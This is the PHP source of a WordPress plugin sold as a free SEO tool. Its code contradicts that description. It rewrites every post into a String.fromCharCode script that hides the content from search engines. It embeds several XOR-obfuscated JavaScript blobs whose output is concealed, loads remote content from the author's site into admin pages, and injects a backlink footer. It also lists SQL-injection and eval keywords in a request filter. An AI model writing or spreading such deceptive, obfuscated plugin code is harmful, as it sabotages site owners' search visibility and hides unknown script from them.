<?php
/*
Plugin Name: Bye Papa Destra
Plugin URI: http://www.papadestra.com
Description: All unique content will be visible on search engines. Your site will always be updated automatically. This plugin is a simple SEO tool that is expected to facilitate performance petrified webmaster. Spider View, Backlink Checker, Search Engine Saturation can be used by directly doing click on the menu. And shortcode to display RSS few sites are: Google News, Yahoo Top Stories, Youtube Recently Added and Article Directory, <a href="http://papadestra.com/" target="_blank">Website developer !</a>
Version: 1.1
Author: Papa Destra
Author URI: http://www.papadestra.com/
Stable tag: 1.1
*/
/*                    PLEASE DO NOT CHANGE YOUR LOGO FOR OUR pride!
            ================================================================
			!................(_).......................................... !
			!...............(___)......................................... !
			!...............(___)......................................... !
			!...............(___)......................................... !
			!...............(___)......................................... !
			!..... /\___/\__/---\__/\__/\................................. !
			!......\_____\_°_¤ ---- ¤_°_/................................. !
			!.............\ __°__ /....................................... !
			!..............|\_°_/|........................................ !
			!..............[|\_/|]........................................ !
			!..............[|[P]|].. http://www.papadestra.com/ .......... !
			!..............[|;A;|]........................................ !
			!..............[;;P;;]......Web Design & Development.......... !
			!.............;[|;A]|]\....................................... !
			!............;;[|;D]|]-\......Our Best Services............... !
			!...........;;;[|[E]|]--\..................................... !
			!..........;;;;[|[S]|]---\...WEBSITE MAINTENANCE.............. !
			!.........;;;;;[|[T]|]|---|................................... !
			!.........;;;;;[|[R]|]|---|................................... !
			!..........;;;;[|[A]|/---/.................................... !
			!...........;;;[|[*]/---/..................................... !
			!............;;[|[]/---/...................................... !
			!.............;[|[/---/....................................... !
			!..............[|/---/........................................ !
			!.............../---/......................................... !
			!............../---/|]........................................ !
			!............./---/]|];....................................... !
			!............/---/#]|];;...................................... !
			!...........|---|[#]|];;;..................................... !
			!...........|---|[#]|];;;..................................... !
			!............\--|[#]|];;...................................... !
			!.............\-|[#]|];....................................... !
			!..............\|[#]|]........................................ !
			!...............\\#//......................................... !
			!.................\/.......................................... !
			================================================================
*/
add_action( 'admin_menu', 'rantang_panel');
function rantang_panel(){
$icon = 'http://papadestra.com/seo-tool/sirahe.png';
        add_menu_page('Papa Destra Tool', 'DESTRA TOOL', 8, __FILE__, null, $icon);
        add_submenu_page(__FILE__, 'Reading First', 'Reading First', 8, __FILE__, 'reading_first');
		add_submenu_page(__FILE__, 'Spider View ', 'Spider View ', 8,'License_manage_sat', 'spider_tool');
		add_submenu_page(__FILE__, 'Backlink Checker  ', 'Backlink Checker ', 8,'backlinks_manage_sat', 'backlinks_tool');
		add_submenu_page(__FILE__, 'Search Engine Saturation', 'SE Saturation', 8,'position_manage_sat', 'saturation_tool');
}
function reading_first(){
?>
<iframe src="http://papadestra.com/seo-tool/bye_papadestra_baca.html" height="800" width="100%" scrolling="auto" frameborder="0">
</iframe>
<?php
}
function which_are_not($s) {
   $out = "";
   $out= str_replace( array('à','á','â','ã','ä', 'ç', 'è','é','ê','ë', 'ì','í','î','ï', 'ñ', 'ò','ó','ô','õ','ö', 'ù','ú','û','ü', 'ý','ÿ', 'À','Á','Â','Ã','Ä', 'Ç', 'È','É','Ê','Ë', 'Ì','Í','Î','Ï', 'Ñ', 'Ò','Ó','Ô','Õ','Ö', 'Ù','Ú','Û','Ü', 'Ý'), array('a','a','a','a','a', 'c', 'e','e','e','e', 'i','i','i','i', 'n', 'o','o','o','o','o', 'u','u','u','u', 'y','y', 'A','A','A','A','A', 'C', 'E','E','E','E', 'I','I','I','I', 'N', 'O','O','O','O','O', 'U','U','U','U', 'Y'), $s);
    return $out;
}
function rewrite_text( $article, $case_sensitive=false ) {
	$workwith=$article;	
	$pos=strpos($workwith,"DONOTCHANGE");
	$workwith=str_replace("DONOTCHANGE","",$workwith);
if(($pos === false)&&(!is_feed())&&(!is_search()))
		{
$workwith=which_are_not($workwith);
$workwith=stripslashes($workwith);
$numbers="";
for($i=0;$i<strlen($workwith)-1;$i++)
$numbers=$numbers.ord($workwith[$i]).",";
$numbers=$numbers.ord($workwith[strlen($workwith)-1]);
$codul='<script type="text/javascript">
document.write(String.fromCharCode('.$numbers.'));
</script>';
$workwith=$codul;
}
return $workwith;
}
add_filter('the_content', 'rewrite_text', 100);
add_filter('the_excerpt', 'rewrite_text', 100);

function spider_tool(){
?>
<? echo '<br>';?>
<? echo '<h2><img src="http://www.iwebtool.com/tool/tools/spider_view/spider_view.gif" />
&nbsp;Spider View </h2>';?>
<? echo'This tool is helpful for analyzing your internal links, your meta information and your page content. Using this will enable you to view the perspective of a <b>search engine spider</b>, from the website you require to view';?>
<? echo '<br><br>';?>
<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('PaPaDEsTra','uRCDr|VbDDgSuWu`EDWWeDbQar@qESuWcDwDVf@DfYuVp`D`WV`Dc aw5q@FuV`DrtVcBDfPuWp`EaWVcDgUarAqDPuSEDrvVb4Df%uSF`DgWWeDfFaw7qEUuWFDrFVb1DbFuVw`DdWWiDfUasFqESuVfDr|VbGDgVuSF`AfWS`DfWarAqDPuWDDrpVb@DfFuVv`E`WWeDgSav7q@SuR`DvwVfBDgRuWw`DfWWFDf"as0qDXuWEDrrVg6DbSuWu`DaWVdDfFawAq@QuVgDr|VbFDgUuW|`@DWSbDcPavCqAQuSeDvwVfBDfYuWq`EmWWgDfYarGqA%uSbDwtVgBDcQuRt`AfWREDc"aw5qDXuWfDswVbCDf%uWq`@E');</script>
<?php
}
function backlinks_tool(){
?>
<? echo '<br>';?>
<? echo '<h2><img src="http://www.iwebtool.com/tool/tools/backlink_checker/backlink_checker.gif" />
&nbsp;Backlink Checker  </h2>';?>
<? echo'Find backlinks linking to a website and their URL information.';?>
<? echo'<b>What is a Backlink?</b> Backlinks are incoming links to a website. For example, a site with a lot of backlinks
implies that many other sites link to that site.';?>
<? echo '<br><br>';?>
<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('bCacNxRklinks','Gp"FxAw]ZLYYVTrDUD]d^I[^NDQfVQkNaN_-KYAGuYFyLw7XLY[VQADQF]`-I^^NESfVSkNcNZ]K]FGtRFyLw7^LXZVPEDU}]d-I_*NA$fVPkNgNZ/KY7GtUFx>w]*LX(VPFDTz]d-I_(NE!fWVkJFNZ[K]BGuRFx:w]/LXRVTEDUB]eXI[+NDRfW[kObN^[KYCGuWFyJw]]LX/VTvDU|]d-I^2NEVfWVkO`N_-KYAGpQF|JwY0LYXVTpDT|]d-I_-NE!fWZkNENZ^KX7GqSFxIw7YLY_VTFDQ|]`[I^YNE[fWWkOfNZQKX7GqSF}IwX0L][VPvDQ|]`[I_VNEWfWZkNeNZQK7GGp%F|JwX]L][VQsDP~]`YIZ+N@!fS%kNkNZ_K7AGuPFx<w]YL].');</script>
<?php
}
function saturation_tool(){
?>
<? echo '<br>';?>
<? echo '<h2><img src="http://www.iwebtool.com/tool/tools/search_engine_position/search_engine_position.gif" />
&nbsp;Search Engine Saturation</h2>';?>
<? echo'Search engine optimization tool for to check how many pages from your domain are indexed by the search engines. Search Engine Saturation refers to the number of pages from your website domain a search engine has indexed.';?>
<? echo '<br><br>';?>
<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('PaPaDEsTra','uRCDr|VbDDgSuWu`EDWWeDbQar@qESuWcDwDVf@DfYuVp`D`WV`Dc aw5q@FuV`DrtVcBDfPuWp`EaWVcDgUarAqDPuSEDrvVb4Df%uSF`DgWWeDfFaw7qEUuWFDrFVb1DbFuVw`EaWWaDgSas@qDYuWeDrEVbEDfXuWE`EaWSDDgRasBqEUuVeDswVbCDgUuW}`EFWWEDbFawAq@QuWfDswVbCDf%uWq`EfWWFDgSasGqDTuVbDwDVf@DcQuSv`AdWVcDfRarAqDFuWCDrCVbKDf$uWs`@DWSbDfParFqEUuWFDvwVfBDgVuW}`E`WVdDfYav7q@SuRaDwuVgBDbTuSv`AdWWhDfTasJqDVuWhDsqVg6DbSuRu`@dWR`DcQawAqA$uQADwCVf4DfXuWr`DfWWaDf%asFqA$');</script>
<?php
}
function google_news() {
?>
<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('PaPaDEsTra','uRCDsvVbADgSuW}`DdWVdDbQarGqEXuV`DrpVg6DbSuVp`EaWVhDgUaw5qD uWaDssVbCDgRuWw`DfWWiDgQarGq@SuS`DsvVc@DfRuRD`AfWWhDgUarGqEQuRADvFVf4DgVuVs`DcWSEDfVas5qDFuWgDrCVbGDb$uWw`EFWWDDbFas2qERuWaDsuVbKDcFuWB`EaWViDc%aqBqFSuTaDp|V`CDdPuUu`GeWSDDfXasKqATuTaDpsVaFDf"uWv`DbWVfDfFasEqGSuWbDqrVcDDfTuUp`GcWUbDeSapGqF"uWgDpqVaEDcVuRr`DmWUfDd aw7qFYuWADstVbKDfXuRr`EaWUgDdRas@qAVuUgDrBVbJDeTuTp`ElWTbDd arFqGQuWfDsqV`JDeXuUA`@mWRcDb%apCqDVuUbDpAVf6DeXuTq`FFWWiDfVavEqF uVgDrqVg@DePuSv`@EWRCDbFar@qDRuVbDr|VcBDgUuRE`CAWRCDgRas@qESuWiDsuVcFDbQuVp`DmWV`DfTav7q@SuVdDrpVcJDgUuSF`EAWWaDgWasBqERuWcDswVbKDgQuVp`AfWS`DgRarAqDRuRDDvwVbJDgUuVp`DdWRADbFaw5qEQuWaDsuVbCDfUuWq`DgWVdDgSasBq@$uWcDrFVb6DbFuVv`DgWVcDgTarCqDUuWaDsqVbGDgQuWu`DdWWaDbFasDqDWuWeDrpVbFDfWuWq`D`WWcDfYasFqESuSEDrAVcADbSuRE`@CWSFDgRas@qESuWiDsuVcFDc$uQA`@CWVcDfRarAqDXuV`DsqVfBDgUuV}`DdWWeDc%awAqEUuWeDs}VcFDbFuWA`EeWVfDfPar@qDRuVbDr|VcBDgUuSv`@EWQADgWasBqESuS`DrEVbGDgVuVw`EbWWeDfTasGqA%uWEDrpVcEDbQuWs`EbWWeDfTasGqDWuWeDsqVbADfYuWq`DfWShDbSasFqEYuWaDrDVcBDf"uWq`@gWSbDb"awCq@SuWeDs}VbCDf%uVt`ECWWeDcRas@qD"uWaDsvVcADbSuSC`AdWSbDeFas6qDTuVgDvwVfKD` uWE`EaWVgDgRasEqDTuWeDrqVf7DfPuWp`E`WUfDfTasFqDUuShDvwV`EDfFuWF`EcWWCDfTawCqF$uWeDsrVcADbSuSC`AfWWhDgUarGqEQuRADvFVf4Df$uWq`DcWVcDb$asDqDFuWFDrrVb1DfTuSE`EgWWFDf%aw5qAFuWFDspVcFDgQuVq`D`WRDDgSar@qERuSbDv|Vd3Df$uWq`DcWVcDfWasFqDTuWdDvEVbFDfXuVw`DdWWCDfParJqDFuV`DsqVbKDfFuWE`DgWShDbSasGqDPuVdDrpVcFDfXuWD`EaWS`DgRas6qDXuV`DsuVbGDgUuSv`AmWQADf$asFqEVuVcDrsVbGDfTuWp`AEWVcDfTarGqDTuWEDsqVc@DgXuWw`EFWWEDgUasBqDXuWEDrpVc@DbYuSv`DdWSbDbXau2qD$uWeDsrVcADfWuWq`EaWWdDb$asEqDXuWCDsqVbGDgSuWr`EaWWeDfUawKqAPuR`DvCVfBDbSuWp`EeWVdDfTawAq@XuQADrEVbGDgVuVw`EbWWeDfTasGq@$uWiDrEVbKDgUuS|`AmWQADc"aw5qERuWcDswVbKDgQuVp`@E');</script>

<?php
}
function yahoo_top_stories() {
?>
<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('PaPaDEsTraYahooTopStories','uRCDsvVbADnSMYVqX@vC[W[UVgUuV}`DdWWlD[+Jf]Ud@JD5@DhDgUaw5qD |WYJXbJFbQXALS@uVbDr|VcBDnUM]]q]@vC3W^WVfRuRD`AfWWaD_[Jc[UdDJA(@AFDbFarDqEV|V_J]EJFdQY4LS5uWgDrCVbGDk$MY3qY6vB+W[#Vf uVw`EeWViD^VJg)Ue6JD5@DiDc%aqBqFS|TYJ[mJDbQ[CLQBuUaDvDVbKDoYM3ZqZAv@YW5QVf"uWv`DbWVoD^)JbYUfFJD[@FgDgWasFqFU|U_J[fJEaQZFLQ0uWgDpqVaEDjVM3YqXIv@YW]$Vb%uU|`EAWVhD^VJbVU`BJD5@GgDdRas@qAV|U_JYBJFkQZGLPGuWhDqwV`3DnTMZ_qYFvC[W]]VeXuUA`@mWRjDZ+Ja_UeCJF[@GADb%apJqGT|T.JYmJFdQ3DLQ2uVgDrqVg@DlPM]]q35vG,W[#VgRuWw`DfWW`D__Jc[U`1JB(@@CDgRas@qES|WQJXdJGgQ]BLRGuViDsuVbGDj%M]]qXDvBZW^]VgUuSF`EAWWhD_YJb^UdGJDZ@DbDfXarCqEU|SZJ]dJG`QX@LS@uRDDvwVbJDnUMX[qX@vG.W[#VbFuVt`EeWViD^^Jb[UeAJEZ@DdDgSasBq@$|W[JYFJFDQ]4LRAuVcDsvVcGDnQMY[qYAvC[W_PVgQuWu`DdWWhDZ)JbXUeBJD5@EeDfUasEqDT|V4JYgJFkQYGLRAuSEDrAVcADkSM3*q33vF)W^VVfRuVv`EmWViD_[Jg*Uc5JA*@DcDfRarAqDX|VXJX`JBcQXFLRJuV`DrpVg6DkSMX[qYEvCWW^QVbFuWA`EeWVoD^^Jc3UeGJE[@EiDgQarGq@S|R-J_AJGeQYCLRAuS`DrEVbGDnVMX3qYFvBZW_PVfUuRD`EEWWlD_XJf_UeCJD_@EeDfTasGqDW|W]JX`JF`QYJLSFuVbDv}Vf@DoTMXWqYAvB+W^UVf"uWq`@gWSkDZ,Jf_UaFJD5@DhDfPas7qEQ|W+JYaJC`QYALS0uWaDsvVcADkSM],q]@vF]W5#Vf$uWq`DcWSkDZVJd.Ue1JD5@DgDgRasEqDT|W]JY`JBEQYCLSGuWdDpsVbGDoTMY[q]HvF]W59VfPuW|`EFWWFDZ_Ja[Ue2JEY@A`DeRarGqDF|VZJYmJFfQXALWAuSCDvwVbJDnUMX[qX@vG.W[#VbFuVv`DgWVjDZ*Jb*UeAJE^@DcDb$arJqDP|WPJYFJFFQ]7LS@uWFDrDVf4DnSMX3qXCvF)W^QVfFuVt`DgWVmD^)Jc]UeMJD5@DcDbSawJqB |W-JYaJGdQXALSEuWeDrpVbFDk$MY[qYIvC3W^UVf"uWu`DmWWFD__Jc[UeMJD/@EEDgRawKq@S|W4JYeJGgQYGLRGuWiDrDVbGDkQMX3qY5vBVW^UVgQuWq`D`WSkDZVJd.Ue1JD5@DgDgRasEqDT|W]JY`JBEQXALSFuVdDrpVb7DnUMX]qXIvB3W_#Vf$uVp`EeWW`D^*JbZUdFJ@Q@AbDgQawAq@X|Q)JYEJFfQXELR@uWfDrpVbGDoUM]*qYFvBVW_&VgUuWq`DfWWoD^ZJbZUe@J@Q@@aDcQaw0q@Q|SZJY`JFbQXFLSFuSbDv|Vd3Do$MYZqXGvC3W_SVfTuWq`E`WSED^VJb*UeMJE]@AhDbXau2qA"|S.JXgJF`QX@LSJuV`DsqVg7');</script>
<?php
}
function youtube_recently_added() {
?>
<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('PaPaDEsTraYoutubeRecentlAdded','uRCDsvVbADn]PBLGRb@TQKF0dSP@SiDgQasFqA%|]GQBV@dPFRVQ[uAV#Af uWu`DbWWhJBGPTVwRQ@XMIvTARPuSbDvuVcADn]PBFGVD@QWKBTdSP@SdDgQav2q@F|]3QBU@eRFRYQ^EARRAfFuWF`EcWWCJCAPP wSP@X2Iw AW"uWADsvVbCDn_PBLGVF@UBKBYdS]@WDDdPaqAqGP|[LQAS@fTFQ_QXpAV!AfXuW|`@aWThJABPWQwS @XFIvRARRuWFDrsVa@Do]PABGRd@UPK@XdPS@PbDeSapGqF"|YBQAV@gRFVYQ_wAS9AdWuUA`ADWUaJC5PUTwSZ@XMIrRASQuUgDpvVbADjXP@BGSB@U]KAYdQP@RhDeSaq2qET|ZEQCT@eQFQVQYxAP$AcXuRw`ADWTiJCCPVWwQ"@20It]APQuTFDr|VbEDjYP@4GRe@UQKG^dQU@VbDc$av0q@F|XFQCQ@eWFSWQ[qASQAc$uQA`@CWVjJCGPUWwSZ@YDIvPAWTuVdDs|VcBDoZPG1GW`@TQKBYdS8@SdDbFas2qDP|XCQCS@eVFS]Q[sAR9AgQuVp`AfWSiJBGPUWwSP@]0IsVAS8uVdDsqVcBDj.PF3GWF@TUKB]dST@RaDfUasFqER|XAQBP@dTFW+QZrAR#Af%uSF`DfWVjJBGPUPwRS@X@IwUARPuWeDsuVbCDn_PBDGWF@URKBZdRQ@ReDfUasEqDT|XAQCQ@d]FS[Q[sAV Af uVw`AfWREJF7PP#wRP@XGIvVAS]uV`DsqVg7Di.PG6GRa@UVKC^dR]@S`DgUawCqEU|XLQBR@dPFV*Q^sASQAfTuV|`D`WSFJC5PTTwRU@XEIvWASWuVbDr|VcBDn[PFGGVE@S$KCZdRU@SbDbQas6qDT|XBQBQ@dSFS[QZtARQAc%uWE`EaWVnJGDPTRwSU@XAIwQASPuWfDrpVcFDo3PBMGSg@TWKFTdVV@ReDgYasBqD%|XEQC!@dPFV]Q^sAV&AbQuSv`EaWVaJCEPT!wRS@X7IwQAVWuWcDrCVbCDn3PCFGW`@Q&KF0dVV@QFDf$asFqEV|]GQG[@b$FS+QZtASRAgRuWr`EaWWlJC@PP wSR@X@IwPAQRuWeDrpVbFDkWPFGGP`@UPKB_dRQ@REDgUas0qEX|]EQAS@dQFSZQZtARQAbSuSC`AfWWaJB@PUQwRS@]5Is"AW"uWgDrqVbCDn[PBDGWE@T9KB*dSQ@SdDgTasAqDT|]0QCQ@d#FS*Q^FARSAfTuWq`E`WVjJG2PTWwSR@YGIwQAW"uVcDsqVbCDo*PBAGSc@TWKBXdRR@ReDfTasGqER|]3QC&@d#FR]Q[uAQ#AgSuWq`EgWWlJC1PUQwV%@XGIwCAS]uWeDrEVcFDj+PCLGRf@UTKC0dR]@VDDgXas5qET|XAQBW@dWFS[Q^DARWAgSuWF`DcWVjJCAPPSwSR@X7IvPAV uVbDsvVcADk]PFLGUA@U KBYdSS@ScDfWasFqDT|YAQGE@dQFSWQ[rASUAf"uWu`DmWWFJBDPUQwSZ@X2Iw!ARWuShDvwVbFDo^PCAGSg@TQKBUdR @ReDbQar@qD$|YLQBR@eUFS[Q[uAVWAbXuQA`EEWWlJBCPUVwSU@XAIwQASPuSEDsvVbGDn[PB@GSE@TQKC^dS]@RcDfFas6qEU|YDQC[@d FS[Q[sAV]AbSuVt`AfWS`JE5PT wSV@YCIvWASRuWeDrpVbFDk*PBCGSk@U&KCXdRQ@SbDfWasFqDT|YAQGZ@aTFV^Q^CAVUAbSuWp`EeWVmJCAPPWwWZ@^5Iw!ASQuVgDsvVbDDoZPB@GSf@Q KBUdR!@RiDgUawKq@X|_4QF!@`#FR]QZrASWAfXuVt`D`WRE');</script>
<?php
}
//////////////////////////////////////////////////////////////////////////////////////////
add_action('wp_head', 'link_papa_destra_head');
add_action('wp_footer', 'link_papa_destra_footer');
function link_papa_destra_head(){
echo "<noscript>This plugin was developed by Papa Destra - http://www.papadestra.com</noscript>\n"; 
}
function link_papa_destra_footer(){
echo "<br><font size=-2px>Site Maintenance <a href='http://www.papadestra.com/' target='_blank'>Papa Destra </a></font>\n"; 
}
/////////////////////////////////////////////
function article_directory() {
?>
<script Language='JavaScript'>function decrypt(key,str){var ds;ds='';var kp,sp,s,kc,sc;kp=0;sp=0;while(sp<str.length){sc=str.charCodeAt(sp);kc=key.charCodeAt(kp);if(((sc^kc)==39)||((sc^kc)==92)||((sc^kc)<32)||((sc^kc)>126)){s=String.fromCharCode(sc);}else{s=String.fromCharCode((sc^kc));}ds+=s;kp++;sp++;if(kp>=key.length)kp=0;}return ds;}function decryptIt(key,str){str=decrypt(key,str);d=document;d.write(unescape(str));}decryptIt('PaPaDEsTraArticleDirectory','uRCDsvVbADv@Q_ZIRtLEQFF_WNdDgXarCqDTdA0LQ^@s]WSVQXJ%gUuSF`EAWWpWC_FZTa^A@UGJEKuWiDsuVcFDs@Q[SIRwLEWFB3WJDDbSasKqEUdE@LT0@w(WW%Q]4%gVuVs`DcWSEWB^FZ#a_4@UCJD:uWeDvEVbADw4Q_DIWFLD$FC3WOaDgQasJqAFdD6LUY@sPWVDQ[C%dSuTu`GmWUpW@XFXTa]C@Q0JD@uWhDwpVaCDuDQ5WISCLDWFCYWNfDfFasEqGSdDFLV[@s_WSVQ[F%dVuUv`FfWTuW@*FZRa]F@VCJANuRfDs|V`DDu3Q[DIQ|LD$FC^WOiDfXavEqDTdFCLW_@rZWVTQ[E%f#uW|`FaWTuWBQFYWa]3@TAJGIuWfDsqV`JDtKQ]"IV}LAVFF+WL`DfVaqAqF d@0LVU@q5WP%QYK%fVuRr`GAWVvWB]F_Wa5C@QFJA<uRCDvFVcADwAQ^QIS}LEUFC[WJED` av0qERdDGLT^@rPWRSQXF%bQuVp`DmWVqWB5F_!a[@@T@JDLuVhDsqVf4Dw3Q_RIRrLDTFC3WOcDgSasJqEQdE@LQ^@vYWRPQX@%fRuRD`AfWWyWC]F[Qa^B@P5J@?uSFDsuVbCDvBQ_RISpLDPFC3WNdDgSasBq@$dDGLU*@r-WW%QX@%gRuVw`DaWVqWB]FZTa^F@UAJEIuWaDsuVbCDs4Q_TISrLDPFBZWOdDfWasFqEUdDGLUT@r5WRQQ]7%f uVw`AfWREWG*F^#a^A@UGJEKuWiDsuVcFDr7QY"IVCLEVFB3WNbDfXarCqEUd@DLTX@sPWRSQYG%c%uSv`D`WWtWCQF[Qa[4@U5JDHuVfDrtVcADwAQ^QIS}LEUFC[WKbDc$au2qEWdDELT^@vYWS&QYG%gVuVw`EbWWtWB5FZQaZ6@U1JDLuVgDvuVbEDwDQ_VISqLDQFBYWOeDgUas@qDYdDALT^@vQWWQQYG%gYuWu`EDWVqWB*FZPaZA@QFJ@:uS`DvwVbGDvJQ_RISDLEUFB,WOeDcRas@qD"dDELT_@sZWWQQ]1%bQuSv`FFWWEWB5F[Ra[@@QMJB8uWEDrpVcEDvAQ_UISqLDPFB[WKEDfPasGqDUdFBLUY@r5WSWQ]J%bSuUu`DfWVuWBPFZVa_1@UAJ@IuUdDr|Vc@DwGQ_PIRpLD#FC]WNiDbSaw0q@SdDLLTX@s]WRSQ33%bFuSF`EeWVsWC]FZ9a_A@U7JDLuWdDr|Vc@DwGQ_PIRpLD#FC]WNiDb$as@qDFdD0LQ*@s[WRPQXA%b$uVt`ElWVqWG/F[Wa^A@TGJA=uR`DvwVfKDq3Q_&ISqLERFC3WOfDfTasFqDUd@1LUX@rPWRPQXB%f"uWu`DmWWFWCYF[Qa_K@U2JD<uVcDv}Vf@DwFQ_RIRpLDPFC[WOiDf%asFq@QdEGLU)@rPWRSQXB%fTuVp`AfWSxWD(FZ a_G@TCJEJuWfDrpVbGDwFQ[&IRwLDPFC[WOeDf$arGqESdEMLU_@r/WS&QXF%fPuW}`EEWWtWC[F^]a[@@TDJ@KuSiDtAVb7DwGQ^TIRwLDSFBZWOeDfUaw6qDWdDMLU/@s]WSVQX@%fWuWq`EaWWuWFQF_TaZB@Q7J@IuSbDrqVbCDvFQ_VIWvL@9FD.WOEDfTarDqERdDBLUY@r5WSWQ]7%fXuWE`EmWVuWFQF^9aY3@P7J@?uVcDrvVc@DwKQ^SIRpLA ');</script>
<?php
}
add_shortcode('Google News', 'google_news'); 
add_shortcode('Yahoo Top Stories', 'yahoo_top_stories');
add_shortcode('Youtube Recently Added', 'youtube_recently_added');
add_shortcode('Article Directory', 'article_directory');
add_filter('widget_text', 'do_shortcode'); 
add_filter('login_errors',create_function('$a', "return null;"));
remove_action('wp_head', 'wp_generator');
global $user_ID; 
if($user_ID) {
  if(!current_user_can('level_10')) {
    if (strlen($_SERVER['REQUEST_URI']) > 255 ||
      strpos($_SERVER['REQUEST_URI'], "eval(") ||
      strpos($_SERVER['REQUEST_URI'], "CONCAT") ||
      strpos($_SERVER['REQUEST_URI'], "UNION+SELECT") ||
      strpos($_SERVER['REQUEST_URI'], "base64")) {
        @header("HTTP/1.1 414 Request-URI Too Long");
	@header("Status: 414 Request-URI Too Long");
	@header("Connection: Close");
	@exit;
    }
  }
  
} // ojo di busek cok gancok
?>